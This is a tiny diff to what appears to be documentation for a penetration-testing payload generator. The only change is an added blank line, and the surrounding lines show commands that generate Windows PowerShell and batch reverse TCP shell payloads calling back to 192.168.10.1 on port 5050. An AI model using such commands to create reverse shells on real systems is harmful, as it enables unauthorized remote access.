@@ -43,6 +43,7 @@ Generate a payload for a Windows PowerShell reverse TCP connection:
 ```python
 generate payload=windows/powershell/reverse_tcp lhost=192.168.10.1 lport=5050
 generate payload=windows/powershell/reverse_tcp lport=5050
+
 generate payload=windows/batch/reverse_tcp lhost=192.168.10.1 lport=5050
 generate payload=windows/batch/reverse_tcp lport=5050
 ```
